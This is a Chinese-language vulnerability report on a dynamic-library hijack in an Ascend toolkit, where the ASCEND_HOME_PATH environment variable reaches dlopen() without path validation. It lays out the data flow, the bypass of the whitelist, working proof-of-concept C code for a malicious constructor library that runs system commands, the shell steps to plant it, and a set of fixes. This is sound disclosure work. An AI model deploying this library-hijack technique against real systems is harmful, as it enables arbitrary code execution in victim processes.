# 漏洞利用分析报告

## 基本信息
- **漏洞ID**: VULN-DF-DATAFLOW-001
- **类型**: Tainted Data to Sensitive Sink (污点数据流向敏感汇点)
- **严重性**: Critical
- **CWE**: CWE-99 (Improper Control of File Resources)
- **置信度**: 85
- **验证状态**: CONFIRMED

## 漏洞描述

完整的数据流从污点源（环境变量 `ASCEND_HOME_PATH`）流向敏感汇点（`dlopen()`），路径上缺乏充分的验证。攻击者可控制环境变量值，进而控制动态库加载路径，实现任意代码执行。

数据流贯穿多个函数和文件，现有防护措施（库名白名单）仅验证文件名，不验证路径，且 CheckCharValid() 函数存在但从未被调用。

## 数据流分析

### 污点源 (Taint Source)

| 属性 | 值 |
|------|------|
| **来源类型** | 环境变量 |
| **变量名** | `ASCEND_HOME_PATH` |
| **位置** | `csrc/common/function_loader.cpp:58` |
| **代码** | `char *ascendHomePath = std::getenv("ASCEND_HOME_PATH");` |
| **信任等级** | untrusted_local（本地环境，可被攻击者控制） |

**分析**: 环境变量在进程启动时由父进程或 shell 设置。在以下场景中，攻击者可控制此变量：
- 容器环境（Docker/K8s 环境变量注入）
- 共享服务器环境（用户可修改自己的环境）
- CGI/Web 应用（通过 Web 服务器配置传递）
- CI/CD 管道（构建环境可被控制）

### 传播路径 (Propagation Path)

```
┌─────────────────────────────────────────────────────────────────────────┐
│                          数据流传播路径                                   │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  [SOURCE] getenv("ASCEND_HOME_PATH")                                    │
│     │                 function_loader.cpp:58                           │
│     │                 类型: 环境变量读取                                 │
│     │                 污点: 完全可控的字符串                             │
│     ▼                                                                   │
│  [PROPAGATION] std::string(ascendHomePath)                              │
│     │                 function_loader.cpp:62                           │
│     │                 类型: 字符串构造                                   │
│     │                 操作: 污点值转为 std::string                       │
│     ▼                                                                   │
│  [PROPAGATION] + "/lib64/" + soName_                                    │
│     │                 function_loader.cpp:62                           │
│     │                 类型: 字符串拼接                                   │
│     │                 操作: 路径构造，污点仍在开头                        │
│     │                 结果: {ASCEND_HOME_PATH}/lib64/{库名}              │
│     ▼                                                                   │
│  [PROPAGATION] Utils::RelativeToAbsPath(soPath)                         │
│     │                 utils.cpp:106-119                                │
│     │                 类型: 路径转换                                     │
│     │                 操作: 相对路径转绝对路径                           │
│     │                 安全性: 无验证，仅拼接 cwd                         │
│     ▼                                                                   │
│  [PROPAGATION] Utils::RealPath(...)                                     │
│     │                 utils.cpp:94-104                                 │
│     │                 类型: 路径规范化                                   │
│     │                 操作: 解析符号链接、消除 ..                        │
│     │                 安全性: 会跟随攻击者的符号链接                     │
│     ▼                                                                   │
│  [CHECK] Utils::FileExist(canonicalPath)                                │
│     │                 utils.cpp:121-127                                │
│     │                 类型: 文件存在检查                                 │
│     │                 操作: access(F_OK)                                │
│     │                 安全性: 仅检查存在，不验证来源                     │
│     ▼                                                                   │
│  [CHECK] Utils::FileReadable(canonicalPath)                             │
│     │                 utils.cpp:129-135                                │
│     │                 类型: 可读性检查                                   │
│     │                 操作: access(R_OK)                                │
│     │                 安全性: 仅检查权限，不验证完整性                   │
│     ▼                                                                   │
│  [SINK] dlopen(soPath.c_str(), RTLD_LAZY)                               │
│                    function_loader.cpp:74                               │
│                    类型: 动态库加载                                      │
│                    影响: 任意代码执行                                    │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### 敏感汇点 (Sensitive Sink)

| 属性 | 值 |
|------|------|
| **汇点类型** | 动态库加载 (dlopen) |
| **位置** | `csrc/common/function_loader.cpp:74` |
| **代码** | `auto handle = dlopen(soPath.c_str(), RTLD_LAZY);` |
| **危险等级** | Critical |
| **影响** | 加载攻击者控制的库，执行任意代码 |

**dlopen 行为分析**:
- 加载成功后，库的 `_init` 和 `__attribute__((constructor))` 函数自动执行
- 无需调用库内任何函数即可触发代码执行
- 库代码在进程地址空间内运行，可访问所有进程资源

### 验证缺失分析

#### 存在但未使用的验证
```cpp
// utils.cpp:137-146 - CheckCharValid() 函数定义
bool Utils::CheckCharValid(const std::string &str)
{
    for (auto &item: INVALID_CHAR) {
        if (str.find(item.first) != std::string::npos) {
            MSPTI_LOGE("The path contains invalid character: %s.", item.second.c_str());
            return false;
        }
    }
    return true;
}
```

**过滤的危险字符**: `\n`, `\f`, `\r`, `\b`, `\t`, `\v`, `\u007F`, `\"`, `'`, `\\`, `%`, `>`, `<`, `|`, `&`, `$`, `;`, `` ` ``

**问题**: 此函数可防止路径注入和命令注入字符，但 CanonicalSoPath() 中从未调用。

#### 存在但无效的验证
```cpp
// function_loader.cpp:47-56 - 库名白名单
static const std::set<std::string> soNameList = {
    "libascend_hal.so",
    "libascendalog.so",
    "libascendcl.so",
    "libhccl.so",
    "libprofapi.so",
};
if (soNameList.find(soName_) == soNameList.end()) {
    return "";
}
```

**问题**: 仅验证 `soName_`（如 `libascendcl.so`），不验证路径前缀。
攻击者可在任意路径创建同名文件。

## 利用分析

### 利用条件

#### 可达性分析
| 入口点 | 调用链 | 说明 |
|--------|--------|------|
| FunctionRegister::Get() | → FunctionLoader::Get() → CanonicalSoPath() | 主要入口 |
| RegisterFunction() | → FunctionRegister::Get() | 外部 API |
| 各模块初始化 | → RegisterFunction() | 应用启动时 |

**结论**: 任何需要加载动态库的功能都会触发此数据流。

#### 可控性分析

| 输入 | 控制程度 | 攻击者影响 |
|------|----------|------------|
| `ASCEND_HOME_PATH` 值 | 完全可控 | 决定加载路径 |
| `soName_` 库名 | 部分可控（白名单限制） | 可选择加载哪个库 |
| 最终加载路径 | 完全可控 | 可精确指定恶意库位置 |

#### 绕过现有防护
| 防护 | 绕过方法 |
|------|----------|
| 库名白名单 | 在恶意路径下创建白名单内的同名库文件 |
| FileExist/FileReadable | 确保恶意库文件存在且可读 |
| RealPath 符号链接解析 | 利用符号链接指向恶意库，或直接创建真实文件 |
| CheckCharValid（未调用） | 直接绕过，无影响 |

### 漏洞影响

#### 直接影响
1. **任意代码执行**
   - 恶意库的构造函数在 dlopen 时自动执行
   - 代码运行在目标进程上下文中
   - 可访问进程所有内存和资源

2. **控制流劫持**
   - 可替换任何库函数实现
   - 后续 dlsym() 获取的函数指针指向恶意实现
   - 完全控制程序行为

3. **持久化驻留**
   - 库代码在进程生命周期内持续运行
   - 可植入后门、hook 关键函数

#### 间接影响
1. **数据泄露**
   - 读取进程内存中的敏感数据（密钥、密码等）
   - 监听并记录 API 调用

2. **权限提升**
   - 若目标进程有特权（如 root），恶意库继承特权
   - 可执行特权操作

3. **横向移动**
   - 在容器化环境中，攻击可传播至其他节点
   - 通过环境变量配置文件影响所有使用相同配置的部署

### 利用难度评估

| 维度 | 等级 | 详细评估 |
|------|------|----------|
| 知识要求 | Low | 仅需了解 dlopen 机制和环境变量 |
| 攻击复杂度 | Low | 设置环境变量 + 创建恶意库即可 |
| 所需权限 | Medium | 需要环境变量控制 + 文件写入 |
| 用户交互 | None | 无需任何用户交互 |
| 成功概率 | High | 一旦条件满足，必定成功 |

**综合难度**: Medium-Low

## PoC 构建思路

### Step 1: 创建恶意动态库
```c
// evil_lib.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// 库加载时自动执行（constructor 属性）
__attribute__((constructor))
static void evil_init(void) {
    // 标记攻击成功
    FILE *f = fopen("/tmp/exploit_success", "w");
    if (f) {
        fprintf(f, "VULN-DF-DATAFLOW-001 exploited!\n");
        fprintf(f, "PID: %d, UID: %d\n", getpid(), getuid());
        fclose(f);
    }
    
    // 执行任意命令
    system("id >> /tmp/exploit_success");
    
    // 可植入后门、hook 函数等
}

// 导出一些假函数供 dlsym 使用
void aclInit(void) {
    printf("[EVIL] aclInit hooked!\n");
}

void aclFinalize(void) {
    printf("[EVIL] aclFinalize hooked!\n");
}
```

### Step 2: 编译恶意库
```bash
# 使用白名单中的库名之一
gcc -shared -fPIC -o libascendcl.so evil_lib.c

# 或使用符号链接绕过
ln -s /path/to/evil.so libascendcl.so
```

### Step 3: 设置攻击环境
```bash
# 创建目录结构
mkdir -p /tmp/attack/lib64

# 放置恶意库
cp libascendcl.so /tmp/attack/lib64/

# 设置环境变量
export ASCEND_HOME_PATH=/tmp/attack
```

### Step 4: 触发漏洞
```cpp
// 目标应用启动时自动触发
// 或手动调用 API
#include "csrc/common/function_loader.h"

// 任何注册函数的调用都会触发库加载
auto func = Mspti::Common::FunctionRegister::GetInstance()->Get("ascendcl", "aclInit");

// dlopen 被调用，恶意库加载
// evil_init() 自动执行
```

### Step 5: 验证成功
```bash
# 检查攻击痕迹
cat /tmp/exploit_success

# 预期输出:
# VULN-DF-DATAFLOW-001 exploited!
# PID: xxx, UID: xxx
# uid=xxx gid=xxx groups=xxx
```

## 修复建议

### 立即修复（高优先级）

#### 修复 1: 调用 CheckCharValid 验证路径字符
```cpp
// function_loader.cpp:CanonicalSoPath()
char *ascendHomePath = std::getenv("ASCEND_HOME_PATH");
if (ascendHomePath == nullptr || ascendHomePath[0] == '\0') {
    return soName_;
}

// 新增: 验证环境变量值不含危险字符
std::string homePathStr(ascendHomePath);
if (!Utils::CheckCharValid(homePathStr)) {
    std::cout << "ASCEND_HOME_PATH contains invalid characters." << std::endl;
    return "";
}

auto soPath = homePathStr + "/lib64/" + soName_;
// ...
```

#### 修复 2: 添加路径白名单验证
```cpp
// 定义允许的安装路径
static const std::set<std::string> allowedInstallPaths = {
    "/usr/local/Ascend",
    "/opt/Ascend",
    "/usr/lib/ascend",
};

// CanonicalSoPath() 中添加
auto canonicalHome = Utils::RealPath(homePathStr);
bool isAllowed = false;
for (const auto& allowed : allowedInstallPaths) {
    if (canonicalHome.find(allowed) == 0) {  // canonicalHome 以 allowed 开头
        isAllowed = true;
        break;
    }
}
if (!isAllowed) {
    std::cout << "ASCEND_HOME_PATH not in trusted installation paths." << std::endl;
    return "";
}
```

#### 修复 3: 完整路径白名单
```cpp
// 验证最终加载路径
auto canonicalPath = Utils::RealPath(Utils::RelativeToAbsPath(soPath));
if (!canonicalPath.empty()) {
    // 验证最终路径在信任目录内
    bool trusted = false;
    for (const auto& base : allowedInstallPaths) {
        if (canonicalPath.find(base) == 0) {
            trusted = true;
            break;
        }
    }
    if (!trusted) {
        std::cout << "Library path outside trusted directories: " << canonicalPath << std::endl;
        return "";
    }
}
```

### 中期改进

1. **使用配置文件替代环境变量**
   - 配置文件可设置固定路径，避免环境变量篡改
   - 配置文件可进行权限控制和完整性校验

2. **添加库文件签名验证**
   ```cpp
   // 加载前验证数字签名
   if (!VerifyLibrarySignature(canonicalPath)) {
       std::cout << "Library signature verification failed." << std::endl;
       return "";
   }
   ```

3. **审计日志**
   ```cpp
   // 记录所有库加载操作
   MSPTI_LOGI("Loading library: %s from path: %s", soName_.c_str(), canonicalPath.c_str());
   ```

### 长期架构改进

1. **移除动态路径依赖**: 编译时确定库路径
2. **使用系统库加载机制**: 依赖系统 ldconfig 配置而非自定义路径
3. **最小权限原则**: 在沙箱环境中加载库
4. **安全启动验证**: 启动时检查所有依赖库完整性

## 参考
- CWE-99: https://cwe.mitre.org/data/definitions/99.html
- CWE-426: https://cwe.mitre.org/data/definitions/426.html (Untrusted Search Path)
- CWE-732: https://cwe.mitre.org/data/definitions/732.html (Incorrect Permission Assignment)
- ATT&CK T1574.006: Dynamic Linker Hijacking